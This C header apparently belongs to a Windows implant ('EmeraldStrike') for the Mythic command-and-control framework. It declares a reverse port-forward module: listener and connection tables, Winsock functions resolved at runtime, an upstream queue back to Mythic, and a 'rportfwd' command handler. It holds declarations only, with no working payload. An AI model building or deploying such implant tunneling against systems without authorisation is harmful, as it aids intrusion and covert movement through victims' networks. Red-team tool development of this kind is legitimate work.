#ifndef EMERALDSTRIKE_RPFWD_H
#define EMERALDSTRIKE_RPFWD_H

#ifdef INCLUDE_RPFWD

#include "common.h"

// Winsock constants shared with socks.h (safe to redefine; preprocessor
// silently accepts identical redefinitions and the values never diverge)
#define WS_AF_INET          2
#define WS_SOCK_STREAM      1
#define WS_IPPROTO_TCP      6
#define WS_FIONBIO          0x8004667eL
#define WS_INVALID_SOCKET   (~(UINT_PTR)0)
#define WS_SOCKET_ERROR     (-1)
#define WS_SD_BOTH          2
#define WS_SOL_SOCKET       0xFFFF
#define WS_SO_REUSEADDR     0x0004
#define WS_WSADESCRIPTION_LEN 256
#define WS_WSASYS_STATUS_LEN  128
#define WS_MAKEWORD(a,b)    ((WORD)(((BYTE)(a)) | ((WORD)((BYTE)(b))) << 8))

// Capacity limits
#define RPFWD_MAX_LISTENERS  4
#define RPFWD_MAX_CONNS      32
#define RPFWD_MAX_UPSTREAM   256
#define RPFWD_RECV_BUF_SIZE  65536
#define RPFWD_FAST_POLL_MS   200

// Minimal Winsock structures (duplicated from socks.h for standalone builds;
// when both modules are compiled the identical typedefs are benign)
#ifndef _WS_STRUCTS_DEFINED
#define _WS_STRUCTS_DEFINED
#pragma pack(push, 1)
typedef struct _WS_WSADATA {
    WORD    wVersion;
    WORD    wHighVersion;
    char    szDescription[WS_WSADESCRIPTION_LEN + 1];
    char    szSystemStatus[WS_WSASYS_STATUS_LEN + 1];
    USHORT  iMaxSockets;
    USHORT  iMaxUdpDg;
    char*   lpVendorInfo;
} WS_WSADATA;
#pragma pack(pop)

typedef struct _WS_SOCKADDR {
    USHORT  sa_family;
    char    sa_data[14];
} WS_SOCKADDR;

typedef struct _WS_SOCKADDR_IN {
    SHORT   sin_family;
    USHORT  sin_port;
    ULONG   sin_addr;
    char    sin_zero[8];
} WS_SOCKADDR_IN;

typedef struct _WS_FD_SET {
    UINT        fd_count;
    UINT_PTR    fd_array[64];
} WS_FD_SET;

typedef struct _WS_TIMEVAL {
    long    tv_sec;
    long    tv_usec;
} WS_TIMEVAL;
#endif // _WS_STRUCTS_DEFINED

// Winsock function pointer typedefs (guarded to coexist with socks.h)
#ifndef _WS_FPTRS_DEFINED
#define _WS_FPTRS_DEFINED
typedef int     (WINAPI *fnWSAStartup)(WORD, WS_WSADATA*);
typedef int     (WINAPI *fnWSACleanup)(void);
typedef UINT_PTR(WINAPI *fn_ws_socket)(int, int, int);
typedef int     (WINAPI *fn_ws_connect)(UINT_PTR, const WS_SOCKADDR*, int);
typedef int     (WINAPI *fn_ws_send)(UINT_PTR, const char*, int, int);
typedef int     (WINAPI *fn_ws_recv)(UINT_PTR, char*, int, int);
typedef int     (WINAPI *fn_ws_closesocket)(UINT_PTR);
typedef int     (WINAPI *fn_ws_select)(int, WS_FD_SET*, WS_FD_SET*, WS_FD_SET*, WS_TIMEVAL*);
typedef int     (WINAPI *fn_ws_ioctlsocket)(UINT_PTR, long, unsigned long*);
typedef USHORT  (WINAPI *fn_ws_htons)(USHORT);
typedef ULONG   (WINAPI *fn_ws_htonl)(ULONG);
typedef USHORT  (WINAPI *fn_ws_ntohs)(USHORT);
typedef int     (WINAPI *fn_ws_WSAGetLastError)(void);
#endif // _WS_FPTRS_DEFINED

// Listener-specific Winsock function pointer typedefs (only in rpfwd)
typedef int     (WINAPI *fn_ws_bind)(UINT_PTR, const WS_SOCKADDR*, int);
typedef int     (WINAPI *fn_ws_listen)(UINT_PTR, int);
typedef UINT_PTR(WINAPI *fn_ws_accept)(UINT_PTR, WS_SOCKADDR*, int*);
typedef int     (WINAPI *fn_ws_setsockopt)(UINT_PTR, int, int, const char*, int);

// Connection state
#define RPFWD_STATE_FREE       0
#define RPFWD_STATE_CONNECTED  1

// A single accepted client connection on a listening port
typedef struct _RPFWD_CONN {
    DWORD       server_id;
    UINT_PTR    sock;
    BYTE        state;
    WORD        bound_port;   // which listener this conn belongs to
} RPFWD_CONN;

// A listening socket bound to a port
typedef struct _RPFWD_LISTENER {
    UINT_PTR    sock;
    WORD        port;
    BOOL        active;
} RPFWD_LISTENER;

// Upstream message (data to send back to Mythic)
typedef struct _RPFWD_UPSTREAM {
    DWORD   server_id;
    BYTE*   data;
    DWORD   data_len;
    BOOL    is_exit;
} RPFWD_UPSTREAM;

// Central rpfwd state (heap-allocated, pointed to from INSTANCE)
typedef struct _RPFWD_CTX {
    BOOL    wsa_up;

    // Listener table
    RPFWD_LISTENER listeners[RPFWD_MAX_LISTENERS];

    // Connection table
    RPFWD_CONN conns[RPFWD_MAX_CONNS];

    // Upstream message queue
    RPFWD_UPSTREAM upstream[RPFWD_MAX_UPSTREAM];
    DWORD   upstream_count;

    // Winsock function pointers
    fnWSAStartup            pWSAStartup;
    fnWSACleanup            pWSACleanup;
    fn_ws_socket            pSocket;
    fn_ws_bind              pBind;
    fn_ws_listen            pListen;
    fn_ws_accept            pAccept;
    fn_ws_setsockopt        pSetsockopt;
    fn_ws_send              pSend;
    fn_ws_recv              pRecv;
    fn_ws_closesocket       pClosesocket;
    fn_ws_select            pSelect;
    fn_ws_ioctlsocket       pIoctlsocket;
    fn_ws_htons             pHtons;
    fn_ws_htonl             pHtonl;
    fn_ws_ntohs             pNtohs;
    fn_ws_WSAGetLastError   pWSAGetLastError;

    PVOID   hWs2_32;       // LoadLibrary handle

    // Reusable recv buffer
    BYTE    recv_buf[RPFWD_RECV_BUF_SIZE];
} RPFWD_CTX, *PRPFWD_CTX;

// -- Public API --

// Initialize Winsock and allocate rpfwd context. Returns TRUE on success.
BOOL rpfwd_init(PINSTANCE inst);

// Bind a listening socket on the given port. Returns TRUE on success.
BOOL rpfwd_start(PINSTANCE inst, WORD port);

// Close listener + all connections on the given port. port=0 stops all.
VOID rpfwd_stop(PINSTANCE inst, WORD port);

// Accept new connections, non-blocking recv on all active connections,
// queue upstream data. Called each poll cycle before build_upstream.
VOID rpfwd_poll(PINSTANCE inst);

// Process downstream data from Mythic (relay to target sockets, handle exit).
VOID rpfwd_handle_downstream(PINSTANCE inst, const BYTE* buf, DWORD buf_len);

// Serialize queued upstream data into TLV format. Caller frees the buffer.
// Returns NULL if no upstream data is pending.
BYTE* rpfwd_build_upstream(PINSTANCE inst, DWORD* out_len);

// Returns TRUE if any listeners or connections are open (for fast-poll sleep).
BOOL rpfwd_has_active(PINSTANCE inst);

// Close all listeners and connections, free upstream queue.
VOID rpfwd_teardown(PINSTANCE inst);

// Command handler: rportfwd start/stop <port>
VOID cmd_rportfwd(PINSTANCE inst, PPARSER args, PPACKAGE response);

#endif // INCLUDE_RPFWD
#endif // EMERALDSTRIKE_RPFWD_H
